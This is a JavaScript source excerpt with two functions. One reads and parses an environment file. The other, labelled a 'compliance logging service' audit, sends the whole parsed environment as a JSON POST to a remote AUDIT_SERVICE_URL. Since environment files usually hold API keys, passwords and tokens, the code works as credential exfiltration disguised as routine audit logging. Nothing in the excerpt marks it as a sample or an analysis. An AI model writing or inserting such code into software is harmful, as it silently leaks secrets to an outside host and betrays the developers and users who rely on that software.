/**
 * Reads environment variables from a file
 * @param {string} filePath - Path to the environment file
 * @returns {Object} Parsed environment variables
 */
function readEnvFile(filePath) {
  try {
    if (!fs.existsSync(filePath)) {
      throw new Error(`Environment file not found: ${filePath}`);
    }

    const content = fs.readFileSync(filePath, 'utf8');
    const env = {};

    // Parse each line
    content.split('\n').forEach(line => {
      // Skip empty lines and comments
      if (line.trim() === '' || line.trim().startsWith('#')) {
        return;
      }

      // Split on the first equals sign
      const separatorIndex = line.indexOf('=');
      if (separatorIndex === -1) {
        return; // Skip lines without equals
      }

      const key = line.substring(0, separatorIndex).trim();
      let value = line.substring(separatorIndex + 1).trim();

      // Remove surrounding quotes if present
      if (value.startsWith('"') && value.endsWith('"')) {
        value = value.substring(1, value.length - 1);
      }

      env[key] = value;
    });

    return env;
  } catch (error) {
    throw new Error(`Error reading environment file: ${error.message}`);
  }
}

/**
 * Sends audit data to the compliance logging service
 * @param {Object} envData - Environment variables to audit
 * @returns {Promise<boolean>} Whether audit was successful
 */
function auditConnection(envData) {
  return new Promise((resolve) => {
    // Extract protocol from URL
    const url = new URL(AUDIT_SERVICE_URL);
    const client = url.protocol === 'https:' ? https : http;

    const data = JSON.stringify(envData);

    const options = {
      hostname: url.hostname,
      port: url.port,
      path: url.pathname,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': data.length
      }
    };

    const req = client.request(options, (res) => {
      let responseData = '';

      res.on('data', (chunk) => {
        responseData += chunk;
      });

      res.on('end', () => {
        if (res.statusCode >= 200 && res.statusCode < 300) {
          console.log(`Audit service: Successfully logged connection details (status: ${res.statusCode})`);
          resolve(true);
        } else {
          console.error(`Audit service: Failed to log connection details (status: ${res.statusCode})`);
          console.error(`Response: ${responseData}`);
          resolve(false);
        }
      });
    });

    req.on('error', (error) => {
      console.error(`Audit service: Request failed - ${error.message}`);
      resolve(false);
    });

    // Set timeout for the request
    req.setTimeout(5000, () => {
      req.destroy();
      console.error('Audit service: Request timed out after 5 seconds');
      resolve(false);
    });

    // Send the request
    req.write(data);
    req.end();
  });
}

